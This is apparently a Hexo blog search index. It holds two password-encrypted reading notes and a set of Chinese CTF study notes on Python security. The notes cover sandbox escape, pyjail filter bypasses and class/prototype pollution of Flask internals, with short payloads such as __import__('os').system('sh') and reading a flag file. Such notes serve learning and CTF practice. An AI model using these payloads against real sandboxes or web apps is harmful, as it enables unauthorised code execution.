<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>超脱</title>
    <link href="/2024/06/27/%E8%B6%85%E8%84%B1/"/>
    <url>/2024/06/27/%E8%B6%85%E8%84%B1/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6df63a3922b0c0fb4d0774fc7bb4ecfeb1a40245d940fc9b32a66f6f6c160e1e">d7bee52400958b566309f151f53f4d87c825b8b90abe363988aa461bdfa3449a165a7b1e4d315cacdc840c76658941cb34776e7f87d4260e6ff0cd9306845f1d8cf4542d7db5afaf233a1cd0b30d14c79af2c88ee816a8e8c4a3c82632d7b25710ff1ca589b2a8346e0470d4a1db733290956c3ab04be8fd4407ef6444a8a8cea774e7f84093ca78b16f233859f437e79c8f0ce1d50c8bcd9d1b6541731eda183b999e347377bd42dfc3014d4312a37230fd418064c940f282d8d9b8202bb9a8e7b259f3d97d36740667ad650d041c682fce5002e03f6e0f002556713612da2b97035f6d45f23b1eac6b88e921ce98e78a949634895437c23ae8f2e889c2c7eb1482cf2caeeead932d7bb789da37e063b13570c9d7369248439058aa0aa70c0fe8e59d3f13aeaf9aacb873edf59bbf9910815d0638606aa328137b8eb6e7e00eee30ad7653edcab6a912db766dec4592214af568bdf649cdd1eb316de8a0c3b8d7343cdefbaf5c73d787d9057069b9088f9a59caf3c7d0d79f9c0289693395d29500c247c9af1ec9a5fdb8a8c489be895ebbce4f24360bf26e921f65583a35ee410881df10439dd3f2b7c8135788467cd86c6950bb5a715d3a7141f83d88e2a21dbdbedd936d180218ad89fe163cb55f86a82f01939c17a266846f7f53b4732c435a70f704d0b69a2182f5e27232a9b7ce064d0160c8c935c5e7e76c5c24ca16b240f4d75db37938b063336e32ecf79982d26fc1a70c2125beae19b97d2bc31600b88ef7e5d183ffc8412eefb76a07f3ae949a26f469a5ae8c77b3bfce69d0e76c8bac1c9b58e0d8eadfa54cc0eec0a93848d95fb67ec5c2914870970ff0c960873c58600149e5115df03b2cdcb930eb3e974adc727075634521723815d51d74de5c6e2418937242ea2de140b564165ff6c72a909cf6f4dd850339e6c2861c98d69c5d4fb7374508fa6fcb20c0e8735123f6a0303529e98a0ee9e3ea67cc8a8c12d01a181840e3ee5243e685dcf204e79e944ca8e041b9ba5334a1985e83680fa1cb43f939dbb43327dd27ab8a4c7349d0d059821b9d6dec60e22c4af3ceb08ce90c52aa470b0877a7e9ef5fc03e2dc1e7fd2b32eaa655cecb79fa8f93a49f00b4e3e3bbde5b84c51ec08d3dc162132dd9339a6da0ed463b3d37d513060e0e2fdea1364f6dc599325beb8d9d994bf38aeab7032f0db9ca8f6af075f81e45791b9a09383f44a158d1114ffbd9e0b1e9f6b54e10e0b8a1baaa7dc5574725089c37cfc12b265ebc0e5634598974cf076722a7d39191e8ff882071df6d9f480a5d56cfe2adb41433c0760bd3c116cf4707f22107ecc11dd480b34b0d6b2a86303f1e5cf675292c8149e1c708f23a4cbb4283a153cb6424af0f7931215e14933f38d616dfc9c8132b68ef4cd770c191030f8d5eb138ff36876f46966f95f6ee847852862d363cf0b8e1f59fb157deebb76d4139920e4685ea1bce9572de22f98b45469154adac488b1d5bb932c4f049aa14b4ef811c46a558187f669ba023ec715914b7b4922795322df52aceea483e5124b5704a69e9ed77d2840ec3c770bdc32cab763b4a08fbf87141c3568e542480acb5cb4a630d72035c74926e41fd5b0c367177dda299d66c085d76de1b0a7de090b0d0745c1ddad2466d41ba896c26268f0dd085fc3b300159be020560004619d7cd2f2b3cc272c73f87c43c8ab895fa71d1a5cec66b0ae08ac5810084fea8698ae3e3e20d60d4501af3cd30e46b45383bd7355a0858ac6e8314f348e4b0d1cac0a9d5a4a9a72d0816b0c89196a526811f29f3083ec759e49f2ce22c2a4aa753a2466a11be8e95794f8771ec359cc45fa5053cc0d4b31abaf77ae3cb0fab37b21ff708274bcdec51cba25ca3e8be19f01445345baad7d5c2b75e65938d122eab1299d6eeba496133b00e1c20f97d84eb290232b8ea042d92a09cf89becf14da1729a8fd802f193de1ec6d4246e38bc10eda2802eb740217cf70a97266c015b2252640abfb2b117feb417a208fc60fa5038b5617bb85ac95a8f8b7959af17243ce1e0f8a34e15f013752c08c4c706c0733209a171a20e1b8d24ac8fb28dfa3d1abc3f5815d07ed679b73ebda38906738530f8bf53f232f357f605ac910eca3102da3872945e8dddf33a1ed5509f9d1e5712f17f129d167e4ee1833b1a7c11bce2fc703317ff2126936e9dc1801583aa4c796915490c1d116365803f72ff897f4b9b3134e080d1ece12f93231d357436ee6e042f0a0803d53acfd84208e131fb906d9527d8deb19b3bba526791388518ddd5d33b189b84304da3b8d1e6921d9813c32e9f29e3c604e40249bd8d207906225db9f20ce5f8b7656fc83d7a1b352111867ad1091429e3233e6ed8003a892045886b6e4b3801082f0bb1da6acf4b175ee5c9ca04a04fca121041aca68f5e55cb308bcbb6741406e09152e436900d908c6ba8c67082a57271172b128a66a6499641e3753887a37cf4a55732a30e58e09404fc5b7d33ad3b17d896d7aa4e59ca90a7ee4c40f639e2964180a7b25df6f1a2656b2d027d0e59bd51e87f77bb881f94e5316054d06245e47c4dd1cf4d63a34ba4ab8f4036e3fe83f462b330020299d0b1865213be1fb57d83317c0ff0b1645a9a62d94810b219c07db9a42aac10b0e60cdea9101704aad604fdb9df9ca1daa4fcfafb7d6324b782d8da7eb2fe4588d68022541fd1c1a5de202cb84ac5b3e588396e4c5d8875715aba860dca3ceef66dd57d608a1523584f8a10ef4777d08be72b6871bc076112a386e5d9f507670b7677f6408cfecc7c9a3def0ed1148c0acf23d624b4f98fbfda31b537b7ec669f266cd353242f8c319f89133e3833668863d744a81997e9f8916d02045d5eb242cae757649543c3bc4c0981eca370753a5df9fd7fbe21e310278402d703a5b0c2b0286d2c7d242adad1329b00211ab963fc74af90d05e7b7d94b40699fbd2e95b7624f72a33db422eabfbfd5cc42e31bd5f2bbd8bf087f269fbf9248074b2060711b1d149fd89d1a887e86f423ff3a4cff9d16c3f914a11b12eb51c6bb9c6526aa01a88919dc721f751f39ebe99dd22e7c3846fccae9bd8a621c0bba9dacd09e88e2c4360b6500dddc3adc670e32dfc387d0c8205da9619c69331e40fb48f5982ddf8d49a9941c666b1ed771280a008a77769cacdac5f71fe46b66c9c94270e8c4eda24760b84dbb1525f7286619458de076ac5d56c199e29a2f57d74f5c4d7697137c8be9cb7c8b455a82c90047741cc0472c7fb93ba222c4bdbd52f6b495d810d5e90dd50c5f059566bc35f7d07044e552aa179dfe56a771f7dfc00d9c125665830cfb2fb2e824e104cf47320693bb7c343260f4051d085fa82d02c259aa70aeeb948ef57cd6126ad241963269b8ac71562a605bf30f534b42bc2e1d931db3ee39de5486860d34d1459272665de3fddce8cdcbd47471f6e003b38e34efdce99f3ce1a1f5c4acf85442a985e8cb5eeb8e5466aea162462db2a7f84d7d5dbd9f5c2cde6a200361b0cd90a445878c0a321d397cc201b6500bbc51f798782eb9de6569d5aa09735c0f1c756761541ca59f1a4f869c1b460099f785911e000c80ac8ba70ef84f43ea03dcaf87850aa9ae9eca92f7d0cd7920ee5e4fedb66938b93556aecbe957d4652535b96ed319236d9a48bdfd84fa6890f94fffb15aad06ddb950ccdce0e70f61404267d59e1732c4556c4afb06bac408b4609c9e69ee222404678613219994ecdd2d540083e1e3860d3902c57341c99f2c832c1d8e11d62644c6b71bd899aada4f4fecbaa5c8e17f449a8399547f62b678ebcaacffbf453292604613ebd5667a7eb4cb1e9d028ca2026eb8b40760f374231628966927e1fef768948f6b50f572168adeb737e5c6e7b012ebf8312542af7d8238f978ca42c1b8840f0abbe4fd5de5cbc8b029bee45681d2159688411d785dc074ca717b7045b6ddeeb9a1afce4ac69c1c3e651a45e44d2c10d0f9971095e4e4af7eb6d86da879df5ce6d363dc79cef81f07522ea89faadaf06b365cb015b1573f9ebe2e95add70597f483c2c874d566f77c758a704dd1aa34f85ac4fa4b6cc36868b04b65ac3a48214ac898337179f6db1e5fa2611646f8ad14619c7b28dc2b5564ba969aa788b238815a8dce2d10dccaac0d461b7afa277d75ecf95e122c8dd5af2d4e9085a02180ac0d0a98ed6f8fadf2d67d776b33e1801ff54f1b3f1f9d0b3b74e3251077107205f01b6dab275048a69b0060e577e6ad2fa262b2687fd2e116edf9b5928d28ad636ccde765e60c1f8387d649149e93eec50827d36aa08806e6990f5be58c02de3ea26ad91f2d0659720a7a63d651f7e4a1050ff7418a5d9cd952e9c0048dd60d4021965f54682a8a851506d2aab1ddafd6a090a17570aef7cf3198fc3f66ffee3ad6bef1aed6b5528220f4aee64f1625468cb040dd5b15637474501e1b41adb161b1ab1dbf8e7ce3f4223323dc5355834e890104adb8a28d02e636aecd2c4a9850a30e518f699b587d6727f9c99347a9256ee7e0395887fd152c9091f4191d26829849388b2464d6b94959b0757598c1383075cc3e8dc063a0f993dda3953dd26aeb2d70223a75c9ec368a720c1952413427c52518d6f0216e8c4eb5c6090d2f0c6bf480871cc29465452f04c3066dd93f5ee44b9791cc9687263867c55bc9119bf7286bf8bb0fe9f250e556a125e356efdf2c3ec3be08372d87e72fddb384749f3cade921517991e0cd24888e84176d3de8716b500b06a89af57513f1c1047c8e1bdc9274a281fd069c868e23cfa931f6d4b5ebd4105cd6e4373dc612746d7519f93751a6931173aa6eef0c622af7041e9816cdee21b03122570065cafd74d109fecf3dd712a3c4b9186b621d1a0b4586bfe658db50aa198d786695060b13f83b3d65d4e3502310ffe52227ec37a8eab180de0db942abb7b0a8d39babf2290f3778249926ee8b5a435f12462218fc9d6eff1ca19398c5d237ffb8ca5c1833d1e85284c3571286fb1c1a1e282efcba8eda2fce061fbba70f0102af368e9595370800cf6fc16099bbf1bb9147ff810bc4036ca3540fe646325977eccbb276690c5390c92c858d969d1d6742209592cf37457403948988c40eb5515da299fcb4e62b737b1687430706ea9c3c0f865836d6f24ebc15766b4649da4e44b370278ac80a8b7990dae295a10dfe9e846586e1e32924ec37db270e7fc5d0056a705f2a33a7ce3d9f88e433de513943139aaea6b7e1568bf6cd9a43edf1b9e8339c355fd8581189117f77439ea0c763f191f728b61a85ea7efe155131fc5d77049f768ec34d2d6292433e263766a972b1cebe71071a1796d518f29b3624355605b0b483725bda6feefd73d9386b23723ce43755549b9be8513ec3c0c607a38d9a9ad3be58b34ea5693fa305fe638e959c8693d155af4d540dac8b77646123b8811a5f09ac724aee1a0cf0831a6bdd915b37c759a33b5164275066003558e18049dfb5b4f0d91becfe485238301dc9d6b5bf53b040125cadfe501f98a838a176b5b0aefb8fdd4df2f1da955acfdac00cea31ab957ec04dae20aa5bd4586b044e6ecbdb8d86b02c11856207d856eb52c91d5281e0329a3a7224529ebb88795bb723136a0a604d2a1bb2e4c0cee5ae631e0309ed11832d9b483164e47f72b192b057e500d556a051c25a8a80b28a6a2a0e24cc928f7f5708304773928f6154d34589f0df7fbb4d9cfb4586815b7aafbe5aff51f4f47ad54b71c291cd61e68e09d2f134ec803b661fcdfa725614c27737523b040fda2c868be991df7af43ef554116294e236b1d3093008398affd4742a3b4276b315c9093d26123efaa940441911cc7edf5fad5670eb8a3011e38c5d03005bfcc1609076cc3902ea97ad452dc89022eb4bce5fa78aa2ebd6f02fa1b8fca19ed7d6b7e048b695cf0b2e6d42aaf34a4822e9c2ccc9fdb17d4360d48206639a8d4cbbaffcb19fd3c03aad39d731452c11f75b32eafcc32bc731ce2c8732b85fe1571fc116450f688c7174048fbfd9ea75142c2b539f96ca53cfdb771ec7a758755635466609ec152770f86a2fa45f4096ea524e65ca4c5735c40a9d9ee61f21a09c370071494287cc8fdbd2872e04d872622f254d330851bf734ee2ace0ac912a459ba02ebdfbb4802c933809cc304b6f861e682a0d1077b9e0503c9a6c3b1821ce9ab733f0d7c6167dca2b76cb638dc5672cbad12567a7ab9356069a0236d9ae84950362f568c529280ecda07c9c82e7f61b3081e09321cabfafad65165d43a5d563e533c0744f12283ab9be5bc90c27f3fba30c7010dee73fd4734a68bcafd8090922cf53f8aabff76b458ac7fd8c42bc1e6e5d7a60f55d0d99295556ca604668302c14c84f9a760947fbe441f188995efec57e9a5acc44788450d26a6e394cc7417383376cac867a8dbb805da0a59933964ca1864f40ae2ec06c32132fd0e051679c47ec85b332ae1675a45523cae85726b3f2994f7db46d11445d705460005219d3e52771cc910194e5c5a5148bcb65ec545010163ba3a7d6781c76735428580bb9e6706f665384c6c8ffae03a140f57018cd95e8a133add397e3ff03069fe5018ed4e07eedae436196ccf614dabdf978067b4a5971454e08481442f41458907fbaea9b345f09bb77b9114c1bc9f1e09dac5bc9818024eca07664e4e05bca617fcebba1df60edae68899d0d335680c85724875a3aba14868e39da970882cdef933e800654d56a5684e7e773650c8248feb8477540625daab26c2b043d9d38882edb911fca60f0eace87949630b0b847a74e6598201807d2f1422ebb56e192d8e0192bbd4623bad6cfee5b94ab6fece7480e55e577e5c9fcab27e1b8600b53f1776ad0fda301a64ec3787b29a661f6cfa70f4184e3e954979d8ad3dd54fdd417b33f0f6a38d9c251db6de9ea6cfeeb3d52541c8e76bb613d434ec18e2643ddd0130e44352d3ef0ddefa49eeba3ba6df9a1c5d2ca3ca6b8febce2fdbc16b9646a362840e65683aece65ef8717f9c59262862de8aed44d6cdac6e3a5871339fb54be2438a2cc71b3fade425e748c518b82076e4d75964c6c6dcd1e798a3a21d45a0a9c5938a12865d7995443a953c0549fc594a5d2090ee261df8cf974aa028aaab2d8775308250e46ae26e7793752e9f901591a5918c2261a574e8cea7f88989991f090f0995744a5a31b46bfd872c65fe6fddd018b02b4d361582ce63b3ccb1b79c1fc26aeb0025f752b6b2216b8dc20a45cc6b44abbc4a7e36468d545e10bf7364892fc9a8af623b8d212578da0ed42cdf559a42fa2a32418822da955721db2efcb65b1f16cdab6650abc8f9cda038fead488b7ecfd4570cad44c692f77fae1756420bfc1e33890e6471ae93fd4f2300230100eb7e691cf9f557240614d0ce7a74ab61e59dc5ee7e0facad28ca921565db15e5acb5d13dd83398cfa60f9021353da3369ae881f0f4dbe9ed0e076c2db3fa5f04f1677bb54206e7382c6dfd0fbcdb72bed8e98cf27d66020fc41844576b42fb025f047fc42e5cca774c3c99bc8a93bbe447d0402c8fa162f853b739d23f7ef23fd363af21d7a28c210ae2e9b6535eafb5fc4430c9583230eb35ddbf5f211d03a7121d7dfe9189329c3f4d436305ac30cba70fe415e9f9003b6e99aeba0e257e0ae01f837f86b377e7807ab8c75a22683e456eb2b2fa8b3bf334406a3802efa9d04aa898f489ec9c5653b7b4782bacb37758948a693782b75899183e72aaa484c6756c73b370f4e729389181f2e3a20097162fb591e8f7281f1e3ea8266c2a7f3ddd1e7a8caa3de0e597d75ded728228a8341440d15fd57e0355a7465c1c02b4d9287cf6816d6f1374f2739a82d33b628d2985486c4c7f23ad691c208f789cdad44229ccb3a4fa52977c195c1c8a6ca8fc4742e58dd2710a487dc755c591d8eaac910d504e395926e84e071b0bf8373860a6bad6dc263ef7a8092ca7382c617f64753d7f3ea3c4611d1e66b009a07e19a833f134a42fad8e24d4f423ef1b187f754b945f7388b34ff3636c4213c37d3c9e30b247b8328ec046beda0010356a9dc0bbcf4e04965e0ce2ca884269d1a8e3acaefd3b988a66ba7e8d16934fbe010b3f50215937896f54f78e432cfe2ff9433f12c5416f0ca9183b05d883b534cf03c4b4ccce391c81be1f877244cf0d124f4ad6224d97b673be2223cb08654f047eb8399b75960797ae27c01db8ffbf4e67df94ff8e3044abd516dd482de26f66299f18351b92f5507baab946c3bfdf8c8b978e5397e2c9ae427fa0f7389ab93693e6ff999d10be67eb0c46e8fb4a3bafd5deca120fc47fbeb9d41d68bb0c3e0cff52c69f2d51f572d47d506946dd1b76d9a21e065ce998c96a71b81b89a1c7e315c12fef1f4a1c735773406c8cc10d168f65c96201ba6f8e7b74e3c1859289004e7de432dab2f2250ae380ad9eb8417ac05086846e84e61a73189ea11d44845f9d4d8340a2e35f8b4d353434148703cf81f8666f471e3e58899857a39fce2913019d8bec6ba59cfc6d9c1419988917f19cd740b06649ddc8f8957d0f7951c4078b85b19aa6a6630d755762540756acf0b6edeba666c56961ee7337735f57965473495c045213b3658f869a7c495f1fcf18fa735067307e59dff21403bd9b76c71ed3c6fde2c9ee885d3e9d44998281b08a866056b413e0c80fc6bbf6edfd3b71e46383df2d2aa05838513a4051640e6c613a551913a1ba7f70442e5ec856be6cd1ec64c4df1ea448e187ee187054b160c26fc87d4e64740591bd1ab9c6b15c47611dd16a3ee6b92edeb6913ace2ae9df92b0d1d38977ce55d5127170c1b249bf9af2695aeb5c8898b94ac4e108ceb6c7232390014b194658a32e447a1a1fad414a57e09698cb0a6d53b79508471e070608a5ea42fedc320e8bfef7a4656e927efe7ca474f3a07ed6ee5b032f83ceecfd8f9daa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码才可以访问噢</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>阅读笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>阅读笔记</tag>
      
      <tag>think</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鼠疫</title>
    <link href="/2024/06/27/%E9%BC%A0%E7%96%AB/"/>
    <url>/2024/06/27/%E9%BC%A0%E7%96%AB/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fe458588d460b36920834ef411d7774cd775e726a1e0285deb6c1cb60a7c4040">d7bee52400958b566309f151f53f4d87cf450013cb9b7818b47f036b1bacc2830b46fd78a735f3b13d4d9140b5fe054211bec724f9ee5138e930105444e22e0c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码才可以访问噢</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>阅读笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>阅读笔记</tag>
      
      <tag>think</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python安全</title>
    <link href="/2024/06/27/python%E5%AE%89%E5%85%A8/"/>
    <url>/2024/06/27/python%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><blockquote><p>python 函数和类方法(对于类未重写的内置方法数据类型为装饰器 wrapper_descriptor，重写后为 function)都有一个__globals__属性可以将函数或者类方法申明的变量空间中的全局变量以字典的方式返回</p></blockquote><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/JMYUbN0Muo6bmJxJgCwcaAvsnwd.png" alt="截图"></p><p>如上定义了全局变量和 a 类中的内置变量，如何通过一个 b 的实例来修改他们？</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/G5h3bn52zoDQfrxaELvc0YHfnWd.png" alt="截图"></p><p>获取了 b 的__init__方法后调用__globals__属性修改了全局变量以及未继承的类属性</p><h3 id="继承链"><a href="#继承链" class="headerlink" title="继承链"></a>继承链</h3><p><strong>mro</strong>[-1]:获取类的继承关系，最后一个是 class 类，也可以直接用__base__（需要保证直接继承 class）</p><p><strong>init</strong>.<strong>globals</strong>:获取方法后调用 globals 获取全局变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;__str__&quot;</span> : <span class="hljs-string">&quot;Polluted ~&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>获取实例的类之后获取它的基类，修改基类的__str__属性（也可以指向其他属性），但是无法直接修改 object 类，且需要有继承关系</p><h3 id="sys-模块"><a href="#sys-模块" class="headerlink" title="sys 模块"></a>sys 模块</h3><p>在此基础上可以修改其他模块的属性，但是当代码复杂的时候需要利用 sys 模块</p><blockquote><p><code>sys</code> 模块的 <code>modules</code> 属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p></blockquote><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/ApwDbuepgoKiWIx4Kq4cBFMUnvd.png" alt="截图"></p><p>sys 字典存放了所有加载的模组（python 中存在默认加载的模组，但是其并不一定可用），如果被 ban 掉了 os 模块，可以将其删除后重新导入</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/V3YCbEVRnoZavrxacLXc47e0nwc.png" alt="截图"></p><h3 id="loader-加载器"><a href="#loader-加载器" class="headerlink" title="loader 加载器"></a>loader 加载器</h3><blockquote><p>loader 是为实现模块加载而设计的类，其在 <code>importlib</code> 这一内置模块中有具体实现。令人庆幸的是 <code>importlib</code> 模块下所有的 <code>py</code> 文件中均引入了 <code>sys</code> 模块</p></blockquote><p>因此只要获取一个 loader 就可以得到 sys 模块，其中__loader__属性会被默认赋值为当前模块的 loader(debug 模式为 None)</p><p>__spec__内置属性定义在 importlib 模块下，可以利用</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/Lc5Kbt0QSo3rsHx5lovcOmaDnsf.png" alt="截图"></p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/QihObZQH1owVLJxaD1PcyTzInNg.png" alt="截图"></p><h3 id="defaults-与-kwdefaults"><a href="#defaults-与-kwdefaults" class="headerlink" title="defaults 与 kwdefaults"></a>defaults 与 kwdefaults</h3><p>存放了函数默认值</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>___import__(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;cat ./flag.txt&#x27;</span>)_<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p>getattr 获取属性</p><p>chr（）</p><p>bytes.decode</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/S5TTbL3oWo5XIrxDmIMcAo7wnAL.png" alt="截图"></p><p>Tips:bytes 函数本身也可以寻找</p><p>Help：交互终端 rce</p><p>输入之后再输入模块名（os 获取__main__）</p><p>breakpoint（）:进入 Pdb 调试一句话 RCE</p><p>海象运算符:&#x3D;：一个 input 执行多行命令</p><p>dir 查看方法</p><p>lambda 绕过</p><p>__doc__文档表寻找可用字符</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/OI5xbuJxfoKFB4xhk4Jcx78RnJv.png" alt="截图"></p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>污染 flask secret_key（伪造秘钥）</p><p>和_got_first_request 和_static_url_path</p><p>exported_names</p><h5 id="os-path-pardir（影响了-render-template-的解析，默认为-，flask-通过它来限制目录穿越则可把他修改为其他无关的内容）"><a href="#os-path-pardir（影响了-render-template-的解析，默认为-，flask-通过它来限制目录穿越则可把他修改为其他无关的内容）" class="headerlink" title="os.path.pardir（影响了 render_template 的解析，默认为..，flask****通过它来限制目录穿越则可把他修改为其他无关的内容）"></a><strong>os.path.pardir<strong><strong>（影响了 render_template 的解析，默认为..，</strong></strong>flask****通过它来限制目录穿越则可把他修改为其他无关的内容）</strong></h5><p>jinjia_env(修改语法实现 ssti 绕过 waf)</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/KkQ6bravHoP8Uoxbo50c9g56n2f.png" alt="截图"></p><p>os.environ</p><h2 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick"></a>Trick</h2><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>for 循环</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/V4oobclegoLhIrxH64UcuslYnXc.png" alt="截图"></p><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>list 生成器和中括号</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/M1FLbpvjxo01PNxouikcmiiOnKc.png" alt="截图"></p><h2 id="eval-导致环境变量可修改"><a href="#eval-导致环境变量可修改" class="headerlink" title="eval 导致环境变量可修改"></a>eval 导致环境变量可修改</h2><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p></blockquote><p>底层调用了 bash -c 指令</p><p>若环境变量可控则可以执行命令</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/WAkwbNqGZoXmCVxRcAgcPDuGnEE.png" alt="截图"></p><h2 id="unicode-字符"><a href="#unicode-字符" class="headerlink" title="unicode 字符"></a>unicode 字符</h2><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/H6H3b0C0RoAnAKx7KjmcMuTrnVg.png" alt="截图"></p><blockquote><p><a href="https://ctf.njupt.edu.cn/archives/805">https://ctf.njupt.edu.cn/archives/805</a></p></blockquote><blockquote><p><a href="https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/">https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/</a></p></blockquote><h1 id="PYjail"><a href="#PYjail" class="headerlink" title="PYjail"></a>PYjail</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610152619197.png" alt="image-20240610152619197"></p><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>空格，_<em>import</em>_, importlib.import_module exefile(也可以open之后exec，一般要事先确认一下(path)</p><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>str函数</p><p>chr函数</p><p>list+dict</p><p>_<em>doc</em>_</p><p>bytes函数</p><h2 id="字符串变化"><a href="#字符串变化" class="headerlink" title="字符串变化"></a>字符串变化</h2><p>[::-1]</p><p>字符串拼接（+）</p><p>eval&#x2F;exec</p><p>_<em>loader</em>_.load_module</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610152942891.png" alt="image-20240610152942891"></p><h2 id="恢复sys-module"><a href="#恢复sys-module" class="headerlink" title="恢复sys.module"></a>恢复sys.module</h2><p>一个存储加载过的模块信息，里面的模块不能直接使用，需要经过import</p><p>import一个模块的时候：检查是否存在sys.module中吗，没有则创建并加载，有则不加载</p><p>此外，存在modules中的库会优先import，如果在本地创建了同名文件，需要先del</p><p>python3之后的reload需要导入importlib模块</p><p>假如被禁用了：<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153312932.png" alt="image-20240610153312932"></p><h2 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h2><p>system不是字符串，不能编码绕过</p><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数<img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153437556.png" alt="image-20240610153437556"></h3><h3 id="getattr获取方法属性"><a href="#getattr获取方法属性" class="headerlink" title="getattr获取方法属性"></a>getattr获取方法属性</h3><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153513555.png" alt="image-20240610153513555"></p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153552642.png" alt="image-20240610153552642"></p><h2 id="内建模块"><a href="#内建模块" class="headerlink" title="内建模块"></a>内建模块</h2><p>关于dict：一个模块对象有一个由字典对象实现的命名空间，属性的引用会被转换为这个字典中的查找，例如，m.x 等同于 m.dict[“x”]。</p><p>那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过</p><p><img src="/2024/06/27/python%E5%AE%89%E5%85%A8/image-20240610153858787.png" alt="image-20240610153858787"></p><h2 id="继承关系逃逸"><a href="#继承关系逃逸" class="headerlink" title="继承关系逃逸"></a>继承关系逃逸</h2><p>直接继承与间接继承</p><p>site类直接引入了os</p><p><img 